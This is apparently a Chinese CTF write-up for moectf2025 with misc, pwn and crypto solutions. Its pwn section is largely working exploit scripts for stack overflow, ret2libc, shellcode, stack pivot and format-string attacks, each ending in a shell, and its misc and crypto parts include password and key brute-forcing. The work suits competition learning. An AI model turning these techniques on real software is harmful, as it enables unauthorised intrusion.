---
title: moectf2025 Week1-Week3 WP
createTime: 2025/10/12 12:23:38
permalink: /article/mr82j248/
---
## misc

### Rush

gif动图，抽帧第12帧有二维码但缺角，用ppt补全第三个角扫码即可

### ez_LSB

丢进StegSolve，勾上red通道即可

### ez_锟斤拷????

exp:

```python
def full_to_half(text):
    result = []
    for char in text:
        code = ord(char)
        if code == 0x3000:
            result.append(' ')
        elif 0xFF01 <= code <= 0xFF5E:
            result.append(chr(code - 0xFEE0))
        else:
            result.append(char)
    return ''.join(result)

with open('flag.txt', 'r', encoding='utf-8') as f:
    s = f.read().strip()

b = s.encode('gb18030')
original = b.decode('utf-8')

flag_full = original
flag_half = full_to_half(flag_full)

print(flag_half)
```

### SSTV

用RX-SSTV，直接播放音频使用内录作为麦克风即可解析为图像，读取flag

### encrypted_pdf

hashcat爆破密码为qwe123，flag藏在图片后，选中复制即可

### 捂住一只耳

用Audacity打开，其中一个声道有摩斯密码，读取即为flag

### Enchantment

用Wireshark打开，发现里面有png文件传输，dump出来发现图中有奇怪的文字，网上搜索得知为标准银河字母加密，对照写出flag

### ez_ssl

在http请求中可以发现sslkey.log，导入Wireshark在http请求中找到一个zip，zip注释中说密码是7位数字，爆破即可

### ez_png

最后一个idat很短，发现zlib文件头，提取出来解压即可

```python
import zlib
import binascii

id = '789CCBCD4F4D2E49ABCE30744971CD8B0F3089CCF14F7489F7F4D3F54C3109A90500A8D00A5F18'
result = binascii.unhexlify(id)
print(result)
result = zlib.decompress(result)
print(result)

```

### 万里挑一

先写个脚本生成字典：

```python
import zipfile
import os
import re
import shutil
from tqdm import tqdm

def try_extract(zip_path, extract_to, password=None):
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            try:
                if password:
                    zip_ref.extractall(extract_to, pwd=password.encode())
                else:
                    zip_ref.extractall(extract_to)
                return True
            except RuntimeError as e:
                if 'encrypted' in str(e):
                    return False
                raise
    except (zipfile.BadZipFile, EOFError):
        return False
    except Exception as e:
        print(f"Unexpected error with {zip_path}: {e}")
        return False

def extract_nested_zips(start_zip, output_folder="extracted", depth=0, max_depth=20):
    if depth > max_depth:
        return []
    
    passwords = []
    current_extract = os.path.join(output_folder, f"layer_{depth}")
    
    if not os.path.exists(current_extract):
        os.makedirs(current_extract)
    
    if not try_extract(start_zip, current_extract):
        if not try_extract(start_zip, current_extract, ""):
            print(f"Failed to extract {start_zip} at depth {depth}")
            return passwords
    
    for root, dirs, files in os.walk(current_extract):
        for file in files:
            file_path = os.path.join(root, file)
            
            if file.endswith('.zip'):
                print(f"Processing {file_path} at depth {depth}")
                new_passwords = extract_nested_zips(file_path, output_folder, depth+1, max_depth)
                passwords.extend(new_passwords)
            
            else:
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                        match = re.search(r'The password is:([a-f0-9]+)', content)
                        if match:
                            passwords.append(match.group(1))
                            print(f"Found password at depth {depth}: {match.group(1)}")
                except Exception as e:
                    print(f"Error reading {file_path}: {e}")

    
    return passwords

def unlock_zip(lock_zip, passwords):
    """Try each password to unlock the lock.zip file."""
    if not os.path.exists(lock_zip):
        print(f"Error: {lock_zip} not found")
        return False
    
    print(f"\nTrying {len(passwords)} passwords to unlock {lock_zip}...")
    
    for password in tqdm(passwords, desc="Testing passwords"):
        try:
            with zipfile.ZipFile(lock_zip, 'r') as zip_ref:
                zip_ref.extractall(pwd=password.encode())
                print(f"password: {password}")
                return True
        except:
            continue
    
    return False

def main():
    # Clear previous extraction if exists
    if os.path.exists("extracted"):
        shutil.rmtree("extracted")
    
    print("Starting deep extraction...")
    passwords = extract_nested_zips('password.zip', max_depth=50)
    
    if not passwords:
        print("\nNo passwords found in the nested structure.")
        return
    
    unique_passwords = []
    seen = set()
    for p in passwords:
        if p not in seen:
            seen.add(p.strip())
            unique_passwords.append(p)
    
    print(f"\nFound {len(unique_passwords)} unique passwords.")
    with open('dict.txt', 'w') as f:
        for pwd in unique_passwords:
            f.write(pwd + '\n')
    print(f"已创建字典文件 dict.txt 包含 {len(unique_passwords)} 个密码")

if __name__ == "__main__":
    main()

```

用AAPR在字典中找到密码，获得flag.zip

flag.zip中有明文.exe，是pe文件，头是固定的，使用bkcrack明文攻击即可



## pwn

### ez_u64

数据转换

```python
from pwn import *
p = remote('127.0.0.1',52128)


p.recvuntil(b"Here is the hint.")
num_bytes = p.recv(8)
num_value = u64(num_bytes)
p.recvuntil(b">")
p.sendline(str(num_value).encode())
p.interactive()

```

### EZtext

简单栈溢出覆盖返回地址

```python
from pwn import *
p = remote('127.0.0.1',51054)

treasure_addr = 0x4011B6
ret_addr = 0x4011DE # gadget
p.recvuntil(b"how many bytes do you need to overflow the stack?\n")
p.sendline(b"32")  # 16 + 8(ret) + 8(treasure) = 32

payload = b'A' * 16
payload += p64(ret_addr)    # 用于栈对齐的 ret 指令
payload += p64(treasure_addr)  # 目标函数

p.send(payload)
p.interactive()

```

### ezshellcode

先把内存设置为可读可写可执行，然后发shellcode即可

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

io = remote("127.0.0.1", 1234)
#io = process("./pwn")


io.recvuntil(b"I will give you some choices. Choose wisely!")
log.info("Sending choice '4' to set memory as RWX")
io.sendline(b"4")
io.recvuntil(b"think about the permissions you just set.")
shellcode = asm(shellcraft.sh())
log.info("Generated shellcode:")
print(hexdump(shellcode))
io.sendline(shellcode)

io.interactive()
```

### find it

问答题

```
I've hidden the fd of stdout. Can you find it?
3
You are right.What would you like to see?
/flag
What is its fd?
1
moectf{******}
```

### 认识libc

ezlibc青春版，已经执行过printf，无需二次返回main

```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

# io = process("./pwn")
io = remote("127.0.0.1", 1234)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")


io.recvuntil(b"A gift of forbidden knowledge, the location of 'printf': ")
leaked_printf_str = io.recvline().strip()
leaked_printf_addr = int(leaked_printf_str, 16)
log.success(f"printf address: {hex(leaked_printf_addr)}")

libc.address = leaked_printf_addr - libc.symbols['printf']
log.success(f"libc base address: {hex(libc.address)}")

pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.symbols['system']
ret_gadget = pop_rdi_ret + 1 

offset_to_rbp = 64
payload = b'A' * offset_to_rbp
payload += p64(0xdeadbeefcafebabe)
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
```

### ezpivot

栈迁移

```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'
elf = ELF('./pwn')
#p = process('./pwn')
p = remote('127.0.0.1', 1234)

rop = ROP(elf)
leave_ret_gadget = 0x40120f
pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret']).address
ret_gadget = rop.find_gadget(['ret']).address
system_addr = elf.plt['system']
desc_addr = elf.symbols['desc']

# 这里我们预留0x800的空间给新栈，太小会导致system函数无法运行
buffer_headroom = 0x800
rop_chain_addr = desc_addr + buffer_headroom

rop_chain = p64(pop_rdi_ret_gadget)
rop_chain += p64(desc_addr)             # RDI -> 指向缓冲区的开头，即 "/bin/sh"
rop_chain += p64(ret_gadget)            # 栈对齐
rop_chain += p64(system_addr)           # 跳转到 system 函数

# [/bin/sh\x00] + [padding] + [Fake RBP for leave] + [ROP Chain]
payload1 = b'/bin/sh\x00'
padding_size = buffer_headroom - len(payload1)
payload1 += b'\x00' * padding_size
payload1 += p64(0xdeadbeefdeadbeef)     # Fake RBP
payload1 += rop_chain

final_payload_to_send = b'-1 ' + payload1
p.recvuntil(b'the length of your introduction.\n')
p.send(final_payload_to_send)
p.recvuntil(b'Ok,we got your introduction!\n')

offset_to_rbp = 12
payload2_pivot = b'A' * offset_to_rbp
payload2_pivot += p64(rop_chain_addr)
payload2_pivot += p64(leave_ret_gadget)

p.recvuntil(b'Now, please tell us your phone number:\n')
p.send(payload2_pivot)

p.interactive()
```

### fmt

格式化字符串漏洞，这里懒得本地调试确定偏移了，直接远程暴力尝试

```python
from pwn import *

HOST = '127.0.0.1'
PORT = 52618

def is_letter(byte_val):
    return (b'a'[0] <= byte_val <= b'z'[0]) or (b'A'[0] <= byte_val <= b'Z'[0])

def find_offsets_remote():
    p = remote(HOST, PORT)

    try:
        start_offset = 7
        end_offset = 25
        probe_payload = b"|".join([f"%{i}$p".encode() for i in range(start_offset, end_offset)])
        
        p.recvuntil(b"what's your name?\n")
        log.info(f"发送单次探测载荷: {probe_payload}")
        p.sendline(probe_payload)
        
        p.recvuntil(b'Nice to meet you,')
        leaked_data = p.recvline().strip()
        leaked_parts = leaked_data.split(b'|')
        
        offset_s2_val = None
        offset_v4_ptr = None

        for index, part in enumerate(leaked_parts):
            current_offset = start_offset + index
            if part.startswith(b'0x5') and not offset_v4_ptr:
                offset_v4_ptr = current_offset
                log.success(f"找到 v4 指针的偏移: {current_offset} -> {part.decode()}")
            try:
                if b'nil' in part:
                    continue
                leaked_val = int(part, 16)
                leaked_bytes = p64(leaked_val)
                if all(is_letter(b) for b in leaked_bytes[:5]) and leaked_bytes[5] == 0:
                    if not offset_s2_val:
                        offset_s2_val = current_offset
                        log.success(f"找到 s2 内容的偏移: {current_offset} -> {leaked_bytes[:5].decode()}")
            except (ValueError, IndexError):
                continue
        p.close()

        if not offset_s2_val or not offset_v4_ptr:
            return None, None
        return offset_s2_val, offset_v4_ptr

    except EOFError:
        p.close()
        return None, None


def exploit(offset_s2, offset_v4):
    log.info(f"s2_offset={offset_s2}, v4_offset={offset_v4}")
    p = remote(HOST, PORT)

    try:
        payload = f'%{offset_s2}$p.%{offset_v4}$s'.encode()

        log.info(f"payload: {payload}")
        p.recvuntil(b"what's your name?\n")
        p.sendline(payload)

        p.recvuntil(b'Nice to meet you,')
        leaked_data = p.recvline().strip()
        log.info(f"leak: {leaked_data}")
        leaked_s2_hex, leaked_v4_str = leaked_data.split(b'.')
        s2_value = int(leaked_s2_hex, 16)
        treasure1 = p64(s2_value)[:5]
        log.success(f"s2: {treasure1}")
        treasure2 = leaked_v4_str[:5]
        log.success(f"v4 content: {treasure2}")
        p.recvuntil(b"Can you find them?\n")
        p.sendline(treasure1)

        p.recvuntil(b"Yeah,another one?\n")
        p.sendline(treasure2)

        p.recvuntil(b"You got it!\n")
        p.interactive()

    except EOFError:
        p.close()


if __name__ == "__main__":
    s2_offset, v4_offset = find_offsets_remote()

    if s2_offset and v4_offset:
        exploit(s2_offset, v4_offset)

```

### randomlock

分析二进制可知seed恒为1，c++生成一串即可

```python
from pwn import *

HOST = '127.0.0.1' 
PORT = 54065

correct_passwords = [
    9383,
    886,
    2777,
    6915,
    7793,
    8335,
    5386,
    492,
    6649,
    1421
]

def main():
    p = remote(HOST, PORT)
    for i, password in enumerate(correct_passwords):
        p.recvuntil(b'>')
        log.info(f"发送密码 {i+1}: {password}")
        p.sendline(str(password).encode())
    p.interactive()

if __name__ == "__main__":
    main()
```

### str_check

栈溢出覆盖返回地址

```python
from pwn import *

p = remote('127.0.0.1', 57640)

backdoor_addr = 0x401236
ret_gadget=0x40124F

padding = b'meow\x00' + b'A' * 35
payload = padding + p64(ret_gadget) + p64(backdoor_addr)
n_copy = len(payload)
p.recvuntil(b"What can u say?\n")
p.sendline(payload)
p.recvuntil(b"So,what size is it?\n")
p.sendline(str(n_copy).encode())

p.interactive()

```

### syslock

lose函数中存在syscall，构造rop调用该syscall即可

```python
from pwn import *

HOST = '127.0.0.1'
PORT = 58708
exe = ELF("./pwn")
context.binary = exe
rop = ROP(exe)
try:
    pop_rdi_rsi_rdx_ret = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]
    pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])[0]
    syscall_addr = rop.find_gadget(['syscall'])[0]
except IndexError as e:
    exit(1)

bss_addr = exe.bss() + 0x200 # 在.bss段找一块可写的空地
read_plt = exe.plt['read']

# 构建ROP链
chain = b''
# --- 调用 read(0, bss_addr, 8) ---
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(0)          # rdi = 0 (stdin)
chain += p64(bss_addr)   # rsi = bss_addr
chain += p64(8)          # rdx = 8 (bytes to read)
chain += p64(read_plt)   # 调用 read 函数

# --- 调用 execve(bss_addr, 0, 0) ---
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(bss_addr)   # rdi = pointer to "/bin/sh"
chain += p64(0)          # rsi = 0
chain += p64(0)          # rdx = 0
chain += p64(pop_rax_ret)
chain += p64(59)         # rax = 0x3b (SYS_execve)
chain += p64(syscall_addr) # 触发系统调用


def main():
    p = remote(HOST, PORT)
    p.recvuntil(b"choose mode\n")
    p.sendline(b'-32')
    p.recvuntil(b"Input your password\n")
    p.send(p32(59)) # '59' 覆盖 i
    p.recvuntil(b"Developer Mode.\n")


    # 72: 64(buf) + 8(saved rbp)
    offset_to_ret = 72
    payload = b'A' * offset_to_ret
    payload += chain
    p.send(payload)
    sleep(0.1)
    p.send(b'/bin/sh\x00')
    p.interactive()


if __name__ == "__main__":
    main()

```

### xdulaker

调用photo时溢出覆盖栈上内容使得laker函数校验通过，构造ROP进入backdoor即可

```python
from pwn import *

context(os='linux', arch='amd64')
#p = process("./pwn")
p = remote("127.0.0.1", 1234)
elf = ELF("./pwn")


p.sendlineafter(b">", b"1")
p.recvuntil(b"Thanks,I'll give you a gift:")
opt_addr = int(p.recvline().strip(), 16)
pie_base = opt_addr - elf.symbols['opt']
log.success(f"PIE Base: {hex(pie_base)}")

payload_for_photo = b'A' * 32 + b'xdulaker'
p.sendlineafter(b">", b"2")
p.sendlineafter(b"Hey,what's your name?!\n", payload_for_photo)

p.sendlineafter(b">", b"3")

p.recvuntil(b"welcome,xdulaker\n")
rop = ROP(elf)

backdoor_addr = pie_base + elf.symbols['backdoor']
ret_gadget_addr = rop.find_gadget(['ret'])[0]
writable_bss_addr = elf.bss()+0x800
log.success(f"backdoor address: {hex(backdoor_addr)}")

payload_for_laker = flat(
    b'A' * (48-8),              # 填充 s1 缓冲区
    writable_bss_addr,      # [rbp] 覆盖旧 rbp 为一个可写地址，以满足 leave 指令
    ret_gadget_addr,        # [rip] 首先跳转到 ret gadget 来对齐栈
    backdoor_addr + 8           # [new_stack] 然后再跳转到 backdoor 函数
)

p.sendline(payload_for_laker)


p.interactive()
```

### eazylibc

先patchelf使本地二进制使用题目给的libc

关键在于获取libc基址

然而有延迟绑定机制的存在，第一次打印的时候read还没有被调用，打印出来的并不是libc中的read，而是plt表中的read

但借此我们可以获取PIE基址

通过PIE基址+偏移我们可以返回到main函数运行第二次

此时由于read已经被调用过所以打印出的是真实地址

减去偏移即可得到libc基址

然后在libc中可以搜索gadget，构造system调用即可

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")
io = process("./pwn")
io = remote("127.0.0.1", 1234)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

io.recvuntil(b"What is this?\nHow can I use ")
leaked_read_str1 = io.recvuntil(b" without a backdoor? Damn!\n", drop=True)
leaked_read_plt = int(leaked_read_str1, 16)
log.success(f"Address: {hex(leaked_read_plt)}")
pie_base = leaked_read_plt - 0x1060
log.success(f"PIE Base Address: {hex(pie_base)}")

elf.address = pie_base
new_stack_rbp = elf.bss() + 0x200
payload1 = b'A' * 32
payload1 += p64(new_stack_rbp) # leave; ret会进行栈迁移
payload1 += p64(pie_base + 0x11ee) 
io.send(payload1)


io.recvuntil(b"What is this?\nHow can I use ")
leaked_read_str2 = io.recvuntil(b" without a backdoor? Damn!\n", drop=True)
leaked_read = int(leaked_read_str2, 16)
log.success(f"Address: {hex(leaked_read)}")
libc_base = leaked_read - libc.sym['read']
log.success(f"libc Base Address: {hex(libc_base)}")
libc.address = libc_base


pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.sym['system']


payload3 = b'B' * 32
payload3 += p64(new_stack_rbp) 
payload3 += p64(pop_rdi_ret + 1)       # ret
payload3 += p64(pop_rdi_ret)       # pop rdi; ret
payload3 += p64(bin_sh_addr)       # -> rdi = address of "/bin/sh"
payload3 += p64(system_addr)       # ret to system()
io.send(payload3)

io.interactive()
```

### fmt_S

每次talk会将flag^1，在bss上查看flag紧邻atk，只要在读取atk时输入长度为8，my_read就可以覆盖flag为0，这样保证我们有3次输入机会

在talk的printf函数调用处下断点发现栈上有链（链上地址都在栈中，这样就可以只修改低位字节），那么可以利用链实行任意地址写

在talk函数的retn处下断点发现rdi为atk，那么可以将atk设置为`/bin/sh`（加上\x00正好8个字节），然后将栈上talk函数的返回地址利用链写成he函数中system的地方即可

```python
from pwn import *

context(os="linux", arch="amd64", log_level="info")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
#io = process("./pwn")
io = remote("127.0.0.1", 1234)

def interact(payload_str):
    fmt = payload_str.ljust(32, b'\x00')
    payload = fmt 
    io.sendafter(b"him...\n", payload)

SYSTEM_CALL_ADDR = 0x40127B
LEAK_RBP_PARAM = 8

interact(f"%{LEAK_RBP_PARAM}$p".encode())
io.recvuntil(b'0x')
leaked_talk_rbp = int(io.recvuntil(b"?", drop=True), 16)-0x20
info(f"Leaked RBP: {hex(leaked_talk_rbp)}")

return_addr_location = leaked_talk_rbp + 0x8 
io.sendafter(b"battle!\n", b'/bin/sh\x00')


fmt2_str = "%{}c%{}$hn".format(return_addr_location % 0x10000, 8+0x48//8).encode()
interact(fmt2_str)
io.sendafter(b"battle!\n", b'/bin/sh\x00')


fmt3_str = "%{}c%{}$hn".format(SYSTEM_CALL_ADDR % 0x10000, 47).encode()
interact(fmt3_str)
io.sendafter(b"battle!\n", b'/bin/sh\x00')

io.interactive()
```



## crypto

### ez_DES

key有三字节未知，爆破即可

```python
from Crypto.Cipher import DES
import string
import itertools

c = b'\xe6\x8b0\xc8m\t?\x1d\xf6\x99sA>\xce \rN\x83z\xa0\xdc{\xbc\xb8X\xb2\xe2q\xa4"\xfc\x07'

key_prefix = 'ezdes'
characters = string.ascii_letters + string.digits + string.punctuation

for suffix_chars in itertools.product(characters, repeat=3):
    try:
        suffix = ''.join(suffix_chars)
        potential_key = (key_prefix + suffix).encode('utf-8')
        cipher = DES.new(potential_key, DES.MODE_ECB)
        decrypted_text = cipher.decrypt(c)
        if decrypted_text.startswith(b'moectf{'):
            flag = decrypted_text.split(b'}')[0].decode('utf-8') + '}'
            print(f"Flag: {flag}")
            break
    except Exception as e:
        continue
```

### baby_next

由于q是p的后114514个素数，因此p，q应该都很接近平方根，尝试平方根附近的素数即可

```python
from Crypto.Util.number import long_to_bytes
import gmpy2
import math

n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397
c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967
e = 65537
ITERATIONS = 114514


s = gmpy2.isqrt(n)
avg_gap = math.log(s)
delta_approx = ITERATIONS * avg_gap
# p ≈ sqrt(n) - delta / 2
p_approx = s - int(delta_approx / 2)
p_candidate = gmpy2.prev_prime(p_approx)
while True:
    if n % p_candidate == 0:
        p = p_candidate
        q = n // p
        print(f"p = {p}")
        print(f"q = {q}")
        break
    p_candidate = gmpy2.prev_prime(p_candidate)


phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)

flag = long_to_bytes(m)

print(f"Flag: {flag.decode('utf-8')}")

```

### ezBSGS

Baby-Step Giant-Step

```python
import math

def solve_bsgs(base, result, modulus):
    m = math.isqrt(modulus) + 1
    baby_steps = {}
    baby_val = 1
    for j in range(m):
        if baby_val not in baby_steps:
            baby_steps[baby_val] = j
        baby_val = (baby_val * base) % modulus
    a_m = pow(base, m, modulus)
    inv_a_m = pow(a_m, modulus - 2, modulus)
    giant_val = result
    for i in range(m):
        if giant_val in baby_steps:
            j = baby_steps[giant_val]
            return i * m + j
        giant_val = (giant_val * inv_a_m) % modulus
    return None


if __name__ == "__main__":
    a = 13
    b = 114514
    p = 100000000000099

    print(f"{a}^x = {b} mod {p}")
    x = solve_bsgs(a, b, p)

    if x is not None:
        print(f"x : {x}")
    else:
        print("none")

```

### ez_square

完全平方公式，然后得到p-q，p+q，然后解出p，q

```python
from Crypto.Util.number import long_to_bytes
import gmpy2

n = 83917281059209836833837824007690691544699901753577294450739161840987816051781770716778159151802639720854808886223999296102766845876403271538287419091422744267873129896312388567406645946985868002735024896571899580581985438021613509956651683237014111116217116870686535030557076307205101926450610365611263289149
c = 69694813399964784535448926320621517155870332267827466101049186858004350675634768405333171732816667487889978017750378262941788713673371418944090831542155613846263236805141090585331932145339718055875857157018510852176248031272419248573911998354239587587157830782446559008393076144761176799690034691298870022190
hint = 5491796378615699391870545352353909903258578093592392113819670099563278086635523482350754035015775218028095468852040957207028066409846581454987397954900268152836625448524886929236711403732984563866312512753483333102094024510204387673875968726154625598491190530093961973354413317757182213887911644502704780304
e = 65537


D = gmpy2.isqrt(hint) # D = p - q
S_squared = 4 * n + D * D
S = gmpy2.isqrt(S_squared) # S = p + q

p = (S + D) // 2
q = (S - D) // 2

assert p * q == n
print(f"p = {p}")
print(f"q = {q}")


phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(f"Flag: {flag.decode('utf-8')}")

```

### ezAES

```python
rc = [0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef,0xf1]

s_box = [
	[0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76],
	[0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0],
	[0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15],
	[0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75],
	[0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84],
	[0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf],
	[0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8],
	[0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2],
	[0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73],
	[0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb],
	[0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79],
	[0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08],
	[0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a],
	[0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e],
	[0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf],
	[0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]
]

s_box_inv = [
	[0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb],
	[0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb],
	[0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e],
	[0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25],
	[0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92],
	[0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84],
	[0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06],
	[0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b],
	[0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73],
	[0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e],
	[0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b],
	[0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4],
	[0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f],
	[0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef],
	[0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61],
	[0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d]
]

def key_expansion(grid):
    for i in range(10 * 4):
        r = grid[-4:]
        if i % 4 == 0:
            for j, v in enumerate(r[1:] + r[:1]):
                r[j] = s_box[v >> 4][v & 0xf] ^ (rc[i // 4] if j == 0 else 0)
        for j in range(4):
            grid.append(grid[-16] ^ r[j])
    return grid

def add_round_key(grid, round_key):
    for i in range(16):
        grid[i] ^= round_key[i]

def inv_sub_bytes(grid):
    for i, v in enumerate(grid):
        grid[i] = s_box_inv[v >> 4][v & 0xf]
        
def inv_mix_columns(grid):
    def mul(a, b):
        p = 0
        for _ in range(8):
            if b & 1: p ^= a
            hi_bit = a & 0x80
            a = (a << 1) & 0xff
            if hi_bit: a ^= 0x1b
            b >>= 1
        return p

    def inv_mix_column(c):
        return [
            mul(c[0], 0x0e) ^ mul(c[1], 0x0b) ^ mul(c[2], 0x0d) ^ mul(c[3], 0x09),
            mul(c[0], 0x09) ^ mul(c[1], 0x0e) ^ mul(c[2], 0x0b) ^ mul(c[3], 0x0d),
            mul(c[0], 0x0d) ^ mul(c[1], 0x09) ^ mul(c[2], 0x0e) ^ mul(c[3], 0x0b),
            mul(c[0], 0x0b) ^ mul(c[1], 0x0d) ^ mul(c[2], 0x09) ^ mul(c[3], 0x0e),
        ]

    for i in range(0, 16, 4):
        grid[i:i + 4] = inv_mix_column(grid[i:i + 4])

def decrypt(block, expanded_key):
    add_round_key(block, expanded_key[-16:])
    inv_sub_bytes(block)
    for i in range(9, 0, -1):
        add_round_key(block, expanded_key[i * 16 : (i+1) * 16])
        inv_mix_columns(block)
        inv_sub_bytes(block)
    add_round_key(block, expanded_key[:16])
    return block

def aes_decrypt(key, ciphertext):
    expanded = key_expansion(bytearray(key))
    b = bytearray(ciphertext)
    for i in range(0, len(b), 16):
        b[i:i + 16] = decrypt(b[i:i + 16], expanded)
    return bytes(b)

if __name__ == '__main__':
    key = b'Slightly different from the AES.'
    enc = b'%\x98\x10\x8b\x93O\xc7\xf02F\xae\xedA\x96\x1b\xf9\x9d\x96\xcb\x8bT\r\xd31P\xe6\x1a\xa1j\x0c\xe6\xc8'

    decrypted_flag = aes_decrypt(key, enc)
